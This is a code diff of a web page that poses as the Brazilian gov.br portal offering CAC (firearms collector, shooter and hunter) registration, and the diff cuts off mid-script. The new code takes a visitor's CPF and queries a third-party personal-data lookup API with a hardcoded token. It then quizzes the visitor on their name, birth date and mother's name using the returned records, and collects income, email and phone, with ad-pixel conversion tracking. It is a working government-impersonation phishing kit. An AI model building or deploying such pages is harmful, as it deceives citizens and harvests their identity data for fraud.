@@ -33,7 +33,7 @@
         
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: #f8f9fa;
+            background: #f5f5f5;
             color: #1a1a2e;
         }
         
@@ -47,120 +47,223 @@
         
         .header {
             background: #fff;
-            padding: 20px;
+            padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             box-shadow: 0 2px 4px rgba(0,0,0,0.08);
-        }
-        
-        .header-logo {
-            display: flex;
-            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
         
         .header-logo img {
-            height: 40px;
+            height: 35px;
         }
         
-        .header-icons {
-            display: flex;
-            gap: 12px;
-        }
-        
-        .icon-btn {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            border: 2px solid #1351b4;
-            background: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            font-size: 18px;
-            transition: all 0.2s;
-            color: #1351b4;
-            font-weight: bold;
-        }
-        
-        .icon-btn:hover {
+        .header-user {
             background: #1351b4;
             color: #fff;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
         
         .container {
-            max-width: 450px;
-            margin: 0 auto;
-            padding: 20px 20px 40px;
+            max-width: 500px;
+            margin: 20px auto;
+            padding: 30px 20px;
             background: #fff;
-            min-height: auto;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
         }
         
-        .main-title {
+        .step-title {
             text-align: center;
-            margin-bottom: 10px;
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 30px;
+            line-height: 1.4;
         }
         
+        .question {
+            margin-bottom: 25px;
+        }
+        
+        .question-number {
+            background: #1351b4;
+            color: #fff;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 12px;
+        }
+        
+        .question-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 15px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #333;
+            background: #fff;
+            transition: all 0.3s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #1351b4;
+            background: #f8f9fa;
+        }
+        
+        .option-button {
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            background: #fff;
+            color: #333;
+            font-size: 15px;
+            text-align: left;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .option-button:hover {
+            border-color: #1351b4;
+            background: #f8f9fa;
+        }
+        
+        .option-button.selected {
+            border-color: #1351b4;
+            background: #e3f2fd;
+            color: #1351b4;
+            font-weight: 600;
+        }
+        
+        .btn-confirmar {
+            width: 100%;
+            padding: 16px;
+            background: #1351b4;
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.3);
+            margin-top: 20px;
+        }
+        
+        .btn-confirmar:hover {
+            background: #0c3a8c;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(19, 81, 180, 0.4);
+        }
+        
+        .btn-confirmar:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .error-message {
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+        }
+        
+        .footer {
+            background: #071d41;
+            color: #fff;
+            padding: 30px 20px;
+            margin-top: 40px;
+            text-align: center;
+        }
+        
+        .footer-logo img {
+            height: 50px;
+            filter: brightness(0) invert(1);
+            margin-bottom: 15px;
+        }
+        
+        .footer-text {
+            font-size: 13px;
+            color: #ccc;
+        }
+        
+        /* Landing page styles */
         .main-title h1 {
-            font-size: 52px;
+            font-size: 48px;
             font-weight: 700;
             line-height: 1.1;
             margin: 0;
+            text-align: center;
         }
         
-        .registre {
-            color: #1a5f3e;
-            display: block;
-        }
-        
-        .seu-cac {
-            display: block;
-        }
-        
-        .seu {
-            color: #d4af37;
-        }
-        
-        .cac {
-            color: #1351b4;
-        }
+        .registre { color: #1a5f3e; display: block; }
+        .seu { color: #d4af37; }
+        .cac { color: #1351b4; }
         
         .subtitle {
             text-align: center;
             color: #1351b4;
             font-size: 16px;
             font-style: italic;
-            margin-bottom: 30px;
+            margin: 10px 0 30px;
         }
         
         .description-box {
-            background: #fff;
-            padding: 25px;
-            margin-bottom: 25px;
+            padding: 20px;
+            margin-bottom: 20px;
         }
         
         .description-title {
             color: #1351b4;
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 600;
-            margin-bottom: 15px;
             text-align: center;
             line-height: 1.4;
+            margin-bottom: 10px;
         }
         
         .description-subtitle {
             color: #1351b4;
-            font-size: 15px;
+            font-size: 14px;
             text-align: center;
-            margin-bottom: 20px;
         }
         
         .btn-iniciar {
             display: block;
-            width: 250px;
+            width: 240px;
             margin: 0 auto 30px;
-            padding: 16px 40px;
+            padding: 16px;
             background: #2d8659;
             color: #fff;
             border: none;
@@ -170,138 +273,11 @@
             cursor: pointer;
             transition: all 0.3s;
             box-shadow: 0 4px 12px rgba(45, 134, 89, 0.3);
-            position: relative;
         }
         
         .btn-iniciar:hover {
             background: #236b46;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(45, 134, 89, 0.4);
-        }
-        
-        .floating-icon {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            width: 50px;
-            height: 50px;
-            background: #1976d2;
-            color: #fff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(25, 118, 210, 0.4);
-            z-index: 1000;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.05);
-            }
-        }
-        
-        .accordion {
-            margin-top: 20px;
-        }
-        
-        .accordion-item {
-            border-bottom: 1px solid #e0e0e0;
-        }
-        
-        .accordion-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 18px 0;
-            cursor: pointer;
-            font-weight: 600;
-            color: #1a1a2e;
-            font-size: 16px;
-        }
-        
-        .accordion-icon {
-            font-size: 12px;
-            transition: transform 0.3s;
-        }
-        
-        .accordion-icon.active {
-            transform: rotate(180deg);
-        }
-        
-        .accordion-content {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.3s ease;
-            color: #555;
-            font-size: 15px;
-            line-height: 1.7;
-        }
-        
-        .accordion-content.active {
-            max-height: 500px;
-            padding-bottom: 16px;
-        }
-        
-        .footer {
-            background: #071d41;
-            color: #fff;
-            padding: 40px 20px;
-            margin-top: 0;
-        }
-        
-        .footer-logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        
-        .footer-logo img {
-            height: 60px;
-            filter: brightness(0) invert(1);
-        }
-        
-        .footer-text {
-            text-align: center;
-            font-size: 14px;
-            line-height: 1.7;
-            color: #ccc;
-        }
-        
-        .footer-text strong {
-            color: #fff;
-        }
-        
-        @media (max-width: 768px) {
-            .container {
-                padding: 20px 15px 30px;
-            }
-            
-            .main-title h1 {
-                font-size: 44px;
-            }
-            
-            .description-title {
-                font-size: 20px;
-            }
-            
-            .btn-iniciar {
-                width: 220px;
-                font-size: 18px;
-            }
-            
-            .floating-icon {
-                bottom: 20px;
-                right: 20px;
-                width: 45px;
-                height: 45px;
-                font-size: 22px;
-            }
+            transform: translateY(-2px);
         }
     </style>
 </head>
@@ -311,12 +287,9 @@
     (function() {
         const params = new URLSearchParams(window.location.search);
         const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'];
-        
         utmParams.forEach(param => {
             const value = params.get(param);
-            if (value) {
-                localStorage.setItem(param, value);
-            }
+            if (value) localStorage.setItem(param, value);
         });
     })();
     </script>
@@ -325,9 +298,8 @@
         <div class="header-logo">
             <img src="images%20gov/govbr.webp" alt="Gov.br">
         </div>
-        <div class="header-icons">
-            <button class="icon-btn" onclick="toggleContrast()" title="Alternar contraste">◐</button>
-            <button class="icon-btn" onclick="window.location.reload()" title="Atualizar">↻</button>
+        <div class="header-user" id="headerUser" style="display: none;">
+            👤 <span id="userName">Usuário</span>
         </div>
     </div>
     
@@ -337,132 +309,123 @@
             <div class="main-title">
                 <h1>
                     <span class="registre">REGISTRE</span>
-                    <span class="seu-cac">
-                        <span class="seu">SEU</span> <span class="cac">CAC</span>
-                    </span>
+                    <span class="seu-cac"><span class="seu">SEU</span> <span class="cac">CAC</span></span>
                 </h1>
             </div>
-            
             <p class="subtitle">e Regularize sua Situação!</p>
-            
             <div class="description-box">
-                <h2 class="description-title">
-                    Conceder Certificado de Registro Pessoa Física - Colecionador, Atirador Desportivo e Caçador (CAC)
-                </h2>
+                <h2 class="description-title">Conceder Certificado de Registro Pessoa Física - Colecionador, Atirador Desportivo e Caçador (CAC)</h2>
                 <p class="description-subtitle">" CR PF " , " Certificado de Registro"</p>
             </div>
-            
-            <button class="btn-iniciar" onclick="mostrarFormulario()">Iniciar</button>
-            
-            <div class="accordion">
-                <div class="accordion-item">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span>▼ O que é?</span>
-                    </div>
-                    <div class="accordion-content">
-                        <p>Concessão de Certificado de Registro para pessoa física para realizar atividades de Colecionamento de armas de fogo, Tiro Desportivo e Caça.</p>
-                    </div>
-                </div>
-                
-                <div class="accordion-item">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span>▼ Quem pode utilizar este serviço?</span>
-                    </div>
-                    <div class="accordion-content">
-                        <p>Cidadãos brasileiros maiores de 25 anos que atendam aos requisitos legais estabelecidos pelo Exército Brasileiro:</p>
-                        <ul style="margin-left: 20px; margin-top: 10px;">
-                            <li>Comprovação de idoneidade</li>
-                            <li>Aptidão psicológica</li>
-                            <li>Capacidade técnica</li>
-                            <li>Ausência de antecedentes criminais</li>
-                        </ul>
-                    </div>
-                </div>
-                
-                <div class="accordion-item">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span>▼ Etapas para a realização</span>
-                    </div>
-                    <div class="accordion-content">
-                        <ul style="margin-left: 20px;">
-                            <li style="margin: 8px 0;">✓ Preenchimento do cadastro online</li>
-                            <li style="margin: 8px 0;">✓ Envio de documentação pessoal</li>
-                            <li style="margin: 8px 0;">✓ Comprovação de endereço</li>
-                            <li style="margin: 8px 0;">✓ Realização de teste psicotécnico</li>
-                            <li style="margin: 8px 0;">✓ Comprovação de capacidade técnica</li>
-                            <li style="margin: 8px 0;">✓ Pagamento de taxas</li>
-                            <li style="margin: 8px 0;">✓ Análise e aprovação pelo Exército</li>
-                        </ul>
-                    </div>
-                </div>
-                
-                <div class="accordion-item">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span>▼ Outras Informações</span>
-                    </div>
-                    <div class="accordion-content">
-                        <p><strong>Prazo:</strong> Até 90 dias após protocolo completo</p>
-                        <p style="margin-top: 8px;"><strong>Validade:</strong> 10 anos</p>
-                        <p style="margin-top: 8px;"><strong>Valor:</strong> R$ 48,70</p>
-                        <p style="margin-top: 8px;"><strong>Base Legal:</strong> Decreto nº 10.030/2019 e Portaria COLOG nº 11/2019</p>
-                    </div>
-                </div>
-            </div>
+            <button class="btn-iniciar" onclick="iniciarCadastro()">Iniciar</button>
         </div>
     </div>
     
-    <!-- PÁGINA 2: Formulário de Cadastro -->
+    <!-- PÁGINA 2: CPF -->
     <div id="page2" class="page">
         <div class="container">
-            <div class="main-title">
-                <h1>
-                    <span class="registre">REGISTRE</span>
-                    <span class="seu-cac">
-                        <span class="seu">SEU</span> <span class="cac">CAC</span>
-                    </span>
-                </h1>
+            <h2 class="step-title">Identifique-se no gov.br com:</h2>
+            <div class="question">
+                <div class="question-number">📋</div>
+                <div class="question-text">Número do CPF</div>
+                <p style="color: #666; font-size: 14px; margin-bottom: 15px;">Digite seu CPF para acessar sua conta gov.br</p>
+                <input type="tel" id="cpfInput" class="input-field" placeholder="Digite seu CPF" maxlength="14">
+                <div class="error-message" id="cpfError">CPF inválido. Por favor, verifique.</div>
             </div>
-            
-            <p class="subtitle">e Regularize sua Situação!</p>
-            
-            <div class="alert-box" style="background: #e8f5e9; border-left: 4px solid #2d8659; padding: 15px; margin-bottom: 30px; border-radius: 4px; display: flex; align-items: flex-start; gap: 12px;">
-                <div style="background: #2d8659; color: #fff; width: 24px; height: 24px; border-radius: 4px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: bold; font-size: 16px;">✓</div>
-                <div style="flex: 1;">
-                    <div style="font-weight: 600; color: #1a5f3e; margin-bottom: 5px;">VERIFICAÇÃO DE CPF</div>
-                    <div style="color: #555; font-size: 14px; line-height: 1.4;">Informe seu CPF para consultar sua situação cadastral e iniciar o processo</div>
-                </div>
-            </div>
-            
-            <form id="cadastroForm" onsubmit="enviarCadastro(event)">
-                <div style="margin-bottom: 20px;">
-                    <label style="display: block; font-weight: 600; margin-bottom: 8px; color: #333; font-size: 14px;">CPF</label>
-                    <input 
-                        type="tel" 
-                        id="cpfInput" 
-                        style="width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 18px; font-weight: 500; color: #333; background: #fff; transition: all 0.3s;"
-                        placeholder="000.000.000-00"
-                        maxlength="14"
-                        required
-                    >
-                    <div id="cpfError" style="color: #d32f2f; font-size: 13px; margin-top: 5px; display: none;">CPF inválido. Por favor, verifique.</div>
-                </div>
-                
-                <button type="submit" class="btn-iniciar" style="margin-top: 10px;">Consultar CPF</button>
-            </form>
-            
-            <div style="background: #e3f2fd; border-radius: 8px; padding: 15px; margin-top: 20px; display: flex; gap: 12px;">
-                <div style="color: #1976d2; font-size: 24px; flex-shrink: 0;">ℹ️</div>
-                <div style="color: #1565c0; font-size: 14px; line-height: 1.5;">
-                    Ao consultar seu CPF, buscaremos automaticamente suas informações cadastrais para agilizar o processo de registro CAC.
-                </div>
-            </div>
+            <button class="btn-confirmar" onclick="consultarCPF()">Continuar</button>
         </div>
     </div>
     
-    <div class="floating-icon" onclick="scrollToTop()" title="Voltar ao topo">
-        ☆
+    <!-- PÁGINA 3: Nome -->
+    <div id="page3" class="page">
+        <div class="container">
+            <h2 class="step-title">Confirme seus dados para o cadastro no Programa CAC do Brasil</h2>
+            <div class="question">
+                <div class="question-number">1</div>
+                <div class="question-text">Qual é seu nome completo?</div>
+                <button class="option-button" onclick="selecionarOpcao(this, 'nome', 0)">Carregando...</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'nome', 1)">Carregando...</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'nome', 2)">Carregando...</button>
+            </div>
+            <button class="btn-confirmar" onclick="proximaEtapa(4)" disabled>Confirmar</button>
+        </div>
     </div>
     
+    <!-- PÁGINA 4: Data Nascimento -->
+    <div id="page4" class="page">
+        <div class="container">
+            <h2 class="step-title">Confirme seus dados para o cadastro no Programa CAC do Brasil</h2>
+            <div class="question">
+                <div class="question-number">2</div>
+                <div class="question-text">Qual é sua data de nascimento?</div>
+                <button class="option-button" onclick="selecionarOpcao(this, 'dataNascimento', 0)">Carregando...</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'dataNascimento', 1)">Carregando...</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'dataNascimento', 2)">Carregando...</button>
+            </div>
+            <button class="btn-confirmar" onclick="proximaEtapa(5)" disabled>Confirmar</button>
+        </div>
+    </div>
+    
+    <!-- PÁGINA 5: Nome da Mãe -->
+    <div id="page5" class="page">
+        <div class="container">
+            <h2 class="step-title">Confirme seus dados para o cadastro no Programa CAC do Brasil</h2>
+            <div class="question">
+                <div class="question-number">3</div>
+                <div class="question-text">Qual é o nome da sua mãe?</div>
+                <button class="option-button" onclick="selecionarOpcao(this, 'nomeMae', 0)">Carregando...</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'nomeMae', 1)">Carregando...</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'nomeMae', 2)">Carregando...</button>
+            </div>
+            <button class="btn-confirmar" onclick="proximaEtapa(6)" disabled>Confirmar</button>
+        </div>
+    </div>
+    
+    <!-- PÁGINA 6: Renda Salarial -->
+    <div id="page6" class="page">
+        <div class="container">
+            <h2 class="step-title">Confirme seus dados para o cadastro no Programa CAC do Brasil</h2>
+            <div class="question">
+                <div class="question-number">4</div>
+                <div class="question-text">Qual é sua faixa salarial atual?</div>
+                <button class="option-button" onclick="selecionarOpcao(this, 'renda', 0)">Desempregado(a)</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'renda', 1)">Até R$ 2.640 (até 2 Salários Mínimos)</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'renda', 2)">De R$ 2.641 A R$ 6.600 (2 A 5 Salários Mínimos)</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'renda', 3)">De R$ 6.601 A R$ 13.200 (5 A 10 Salários Mínimos)</button>
+                <button class="option-button" onclick="selecionarOpcao(this, 'renda', 4)">Acima De R$ 13.200 (mais De 10 Salários Mínimos)</button>
+            </div>
+            <button class="btn-confirmar" onclick="proximaEtapa(7)" disabled>Confirmar</button>
+        </div>
+    </div>
+    
+    <!-- PÁGINA 7: Email -->
+    <div id="page7" class="page">
+        <div class="container">
+            <h2 class="step-title">Confirme seus dados para o cadastro no Programa CAC do Brasil</h2>
+            <div class="question">
+                <div class="question-number">5</div>
+                <div class="question-text">Qual é o seu email?</div>
+                <input type="email" id="emailInput" class="input-field" placeholder="Digite seu email">
+                <div class="error-message" id="emailError">Email inválido.</div>
+            </div>
+            <button class="btn-confirmar" onclick="proximaEtapa(8)">Confirmar</button>
+        </div>
+    </div>
+    
+    <!-- PÁGINA 8: Telefone -->
+    <div id="page8" class="page">
+        <div class="container">
+            <h2 class="step-title">Confirme seus dados para o cadastro no Programa CAC do Brasil</h2>
+            <div class="question">
+                <div class="question-number">6</div>
+                <div class="question-text">Qual é o seu telefone?</div>
+                <input type="tel" id="telefoneInput" class="input-field" placeholder="(11) 99999-9999" maxlength="15">
+                <div class="error-message" id="telefoneError">Telefone inválido.</div>
+            </div>
+            <button class="btn-confirmar" onclick="finalizarCadastro()">Confirmar</button>
+        </div>
+    </div>
+
     <footer class="footer">
         <div class="footer-logo">
             <img src="images%20gov/govbr.webp" alt="Gov.br">
@@ -474,185 +437,253 @@
     </footer>
     
     <script>
-        function mostrarFormulario() {
-            // Dispara evento Meta Pixel
-            if (typeof fbq !== 'undefined') {
-                fbq('track', 'Lead');
-            }
-            
-            // Esconde página 1 e mostra página 2
-            document.getElementById('page1').classList.remove('active');
-            document.getElementById('page2').classList.add('active');
-            
-            // Scroll pro topo
+        let dadosUsuario = {};
+        let dadosAPI = {};
+        
+        function iniciarCadastro() {
+            if (typeof fbq !== 'undefined') fbq('track', 'Lead');
+            mudarPagina(1, 2);
+        }
+        
+        function mudarPagina(de, para) {
+            document.getElementById(`page${de}`).classList.remove('active');
+            document.getElementById(`page${para}`).classList.add('active');
             window.scrollTo(0, 0);
         }
         
-        function enviarCadastro(event) {
-            event.preventDefault();
-            
-            const cpf = document.getElementById('cpfInput').value;
-            const cpfError = document.getElementById('cpfError');
-            const btnContinuar = document.querySelector('#cadastroForm button[type="submit"]');
-            
-            // Valida CPF
-            const cpfLimpo = cpf.replace(/\D/g, '');
-            
-            if (cpfLimpo.length !== 11) {
-                cpfError.textContent = 'CPF inválido. Por favor, verifique.';
-                cpfError.style.display = 'block';
-                return false;
-            }
-            
-            if (/^(\d)\1{10}$/.test(cpfLimpo)) {
-                cpfError.textContent = 'CPF inválido. Por favor, verifique.';
-                cpfError.style.display = 'block';
-                return false;
-            }
-            
-            // Validação do dígito verificador
-            let soma = 0;
-            let resto;
-            
-            for (let i = 1; i <= 9; i++) {
-                soma += parseInt(cpfLimpo.substring(i-1, i)) * (11 - i);
-            }
-            
-            resto = (soma * 10) % 11;
-            if ((resto === 10) || (resto === 11)) resto = 0;
-            if (resto !== parseInt(cpfLimpo.substring(9, 10))) {
-                cpfError.textContent = 'CPF inválido. Por favor, verifique.';
-                cpfError.style.display = 'block';
-                return false;
-            }
-            
-            soma = 0;
-            for (let i = 1; i <= 10; i++) {
-                soma += parseInt(cpfLimpo.substring(i-1, i)) * (12 - i);
-            }
-            
-            resto = (soma * 10) % 11;
-            if ((resto === 10) || (resto === 11)) resto = 0;
-            if (resto !== parseInt(cpfLimpo.substring(10, 11))) {
-                cpfError.textContent = 'CPF inválido. Por favor, verifique.';
-                cpfError.style.display = 'block';
-                return false;
-            }
-            
-            // CPF válido - busca dados na API
-            btnContinuar.disabled = true;
-            btnContinuar.textContent = 'Buscando dados...';
-            cpfError.style.display = 'none';
-            
-            const token = '76418167-38e2-46aa-acf1-51ed15b4db9f';
-            const apiUrl = `https://api.amnesiatecnologia.lat/?token=${token}&cpf=${cpfLimpo}`;
-            
-            fetch(apiUrl)
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Dados da API:', data);
-                    
-                    // Salva dados
-                    localStorage.setItem('cpf', cpf);
-                    
-                    if (data.nome) {
-                        localStorage.setItem('nome', data.nome);
-                    }
-                    
-                    if (data.telefone || data.celular || data.phone) {
-                        const telefone = data.telefone || data.celular || data.phone;
-                        localStorage.setItem('telefone', telefone);
-                    }
-                    
-                    // Salva todos os dados da API
-                    localStorage.setItem('dadosAPI', JSON.stringify(data));
-                    
-                    // Dispara evento Meta Pixel
-                    if (typeof fbq !== 'undefined') {
-                        fbq('track', 'InitiateCheckout');
-                    }
-                    
-                    // Redireciona para endereco etapa 2
-                    window.location.href = 'endereco%20etapa%202/index.html';
-                })
-                .catch(error => {
-                    console.error('Erro ao buscar dados:', error);
-                    
-                    // Mesmo com erro, salva o CPF e continua
-                    localStorage.setItem('cpf', cpf);
-                    
-                    // Dispara evento Meta Pixel
-                    if (typeof fbq !== 'undefined') {
-                        fbq('track', 'InitiateCheckout');
-                    }
-                    
-                    // Redireciona para endereco etapa 2
-                    window.location.href = 'endereco%20etapa%202/index.html';
-                });
-            
-            return false;
-        }
-        
-        // Máscara de CPF
+        // Máscara CPF
         document.addEventListener('DOMContentLoaded', function() {
             const cpfInput = document.getElementById('cpfInput');
-            
             if (cpfInput) {
                 cpfInput.addEventListener('input', function(e) {
                     let value = e.target.value.replace(/\D/g, '');
-                    
                     if (value.length <= 11) {
                         value = value.replace(/(\d{3})(\d)/, '$1.$2');
                         value = value.replace(/(\d{3})(\d)/, '$1.$2');
                         value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
                     }
-                    
                     e.target.value = value;
-                    
-                    const cpfError = document.getElementById('cpfError');
-                    if (cpfError) {
-                        cpfError.style.display = 'none';
+                    document.getElementById('cpfError').style.display = 'none';
+                });
+            }
+            
+            const telefoneInput = document.getElementById('telefoneInput');
+            if (telefoneInput) {
+                telefoneInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length <= 11) {
+                        value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
+                        value = value.replace(/(\d)(\d{4})$/, '$1-$2');
                     }
+                    e.target.value = value;
                 });
             }
         });
         
-        function toggleAccordion(element) {
-            const content = element.nextElementSibling;
-            const icon = element.querySelector('.accordion-icon');
-            const isActive = content.classList.contains('active');
+        function consultarCPF() {
+            const cpf = document.getElementById('cpfInput').value;
+            const cpfLimpo = cpf.replace(/\D/g, '');
             
-            // Fecha todos os accordions
-            document.querySelectorAll('.accordion-content').forEach(item => {
-                item.classList.remove('active');
+            if (!validarCPF(cpfLimpo)) {
+                document.getElementById('cpfError').style.display = 'block';
+                return;
+            }
+            
+            dadosUsuario.cpf = cpf;
+            localStorage.setItem('cpf', cpf);
+            
+            // Busca dados na API
+            const token = '76418167-38e2-46aa-acf1-51ed15b4db9f';
+            const apiUrl = `https://api.amnesiatecnologia.lat/?token=${token}&cpf=${cpfLimpo}`;
+            
+            const btnContinuar = document.querySelector('#page2 .btn-confirmar');
+            btnContinuar.disabled = true;
+            btnContinuar.textContent = 'Consultando...';
+            
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Dados da API:', data);
+                    dadosAPI = data;
+                    preencherOpcoes();
+                    if (typeof fbq !== 'undefined') fbq('track', 'InitiateCheckout');
+                    mudarPagina(2, 3);
+                })
+                .catch(error => {
+                    console.error('Erro API:', error);
+                    dadosAPI = {};
+                    preencherOpcoesGenericas();
+                    mudarPagina(2, 3);
+                });
+        }
+        
+        function validarCPF(cpf) {
+            if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+            let soma = 0, resto;
+            for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
+            resto = (soma * 10) % 11;
+            if ((resto === 10) || (resto === 11)) resto = 0;
+            if (resto !== parseInt(cpf.substring(9, 10))) return false;
+            soma = 0;
+            for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
+            resto = (soma * 10) % 11;
+            if ((resto === 10) || (resto === 11)) resto = 0;
+            return resto === parseInt(cpf.substring(10, 11));
+        }
+        
+        function preencherOpcoes() {
+            // Nome
+            const nomes = gerarOpcoesNome(dadosAPI.nome || dadosAPI.name || 'João Silva Santos');
+            document.querySelectorAll('#page3 .option-button').forEach((btn, i) => {
+                btn.textContent = nomes[i];
+                btn.dataset.valor = nomes[i];
             });
             
-            document.querySelectorAll('.accordion-icon').forEach(item => {
-                item.classList.remove('active');
+            // Data Nascimento
+            const datas = gerarOpcoesData(dadosAPI.nascimento || dadosAPI.birthdate || '01/01/1990');
+            document.querySelectorAll('#page4 .option-button').forEach((btn, i) => {
+                btn.textContent = datas[i];
+                btn.dataset.valor = datas[i];
             });
             
-            // Se não estava ativo, abre
-            if (!isActive) {
-                content.classList.add('active');
-                if (icon) icon.classList.add('active');
+            // Nome Mãe
+            const nomesMae = gerarOpcoesNomeMae(dadosAPI.mae || dadosAPI.mother || 'Maria Silva Santos');
+            document.querySelectorAll('#page5 .option-button').forEach((btn, i) => {
+                btn.textContent = nomesMae[i];
+                btn.dataset.valor = nomesMae[i];
+            });
+            
+            // Preenche email se tiver
+            if (dadosAPI.email) {
+                document.getElementById('emailInput').value = dadosAPI.email;
             }
-        }
-        
-        function toggleContrast() {
-            document.body.style.filter = document.body.style.filter === 'invert(1)' ? 'invert(0)' : 'invert(1)';
-        }
-        
-        function scrollToTop() {
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        
-        // Abre o primeiro accordion por padrão
-        window.addEventListener('load', function() {
-            const firstAccordion = document.querySelector('.accordion-header');
-            if (firstAccordion) {
-                toggleAccordion(firstAccordion);
+            
+            // Preenche telefone se tiver
+            if (dadosAPI.telefone || dadosAPI.phone || dadosAPI.celular) {
+                const tel = dadosAPI.telefone || dadosAPI.phone || dadosAPI.celular;
+                document.getElementById('telefoneInput').value = formatarTelefone(tel);
             }
-        });
+            
+            // Atualiza header
+            document.getElementById('userName').textContent = (dadosAPI.nome || dadosAPI.name || 'Usuário').split(' ')[0];
+            document.getElementById('headerUser').style.display = 'flex';
+        }
+        
+        function gerarOpcoesNome(nomeCorreto) {
+            const partes = nomeCorreto.trim().split(' ');
+            const opcoes = [nomeCorreto];
+            
+            // Opção 2: troca ordem
+            if (partes.length >= 3) {
+                opcoes.push(`${partes[1]} ${partes[0]} ${partes.slice(2).join(' ')}`);
+            } else {
+                opcoes.push(`${partes[partes.length-1]} ${partes.slice(0,-1).join(' ')}`);
+            }
+            
+            // Opção 3: nome aleatório
+            const nomesAleatorios = ['Carlos Eduardo Silva', 'Ana Paula Santos', 'José Roberto Oliveira', 'Mariana Costa Lima'];
+            opcoes.push(nomesAleatorios[Math.floor(Math.random() * nomesAleatorios.length)]);
+            
+            return opcoes;
+        }
+        
+        function gerarOpcoesData(dataCorreta) {
+            const opcoes = [dataCorreta];
+            const partes = dataCorreta.split('/');
+            if (partes.length === 3) {
+                opcoes.push(`${partes[0]}/${(parseInt(partes[1]) + 2).toString().padStart(2, '0')}/${parseInt(partes[2]) + 10}`);
+                opcoes.push(`${(parseInt(partes[0]) + 5).toString().padStart(2, '0')}/${partes[1]}/${parseInt(partes[2]) - 5}`);
+            } else {
+                opcoes.push('15/06/1985', '22/11/1992');
+            }
+            return opcoes;
+        }
+        
+        function gerarOpcoesNomeMae(nomeCorreto) {
+            const opcoes = [nomeCorreto];
+            const nomesAleatorios = ['Ana Maria Silva', 'Josefa Santos Costa', 'Rita Oliveira Lima', 'Helena Pereira Souza'];
+            opcoes.push(nomesAleatorios[Math.floor(Math.random() * nomesAleatorios.length)]);
+            opcoes.push(nomesAleatorios[(Math.floor(Math.random() * nomesAleatorios.length) + 1) % nomesAleatorios.length]);
+            return opcoes;
+        }
+        
+        function preencherOpcoesGenericas() {
+            document.querySelectorAll('#page3 .option-button').forEach((btn, i) => {
+                const nomes = ['João Silva Santos', 'Carlos Eduardo Oliveira', 'Ana Paula Costa'];
+                btn.textContent = nomes[i];
+                btn.dataset.valor = nomes[i];
+            });
+            
+            document.querySelectorAll('#page4 .option-button').forEach((btn, i) => {
+                const datas = ['01/01/1990', '15/06/1985', '22/11/1992'];
+                btn.textContent = datas[i];
+                btn.dataset.valor = datas[i];
+            });
+            
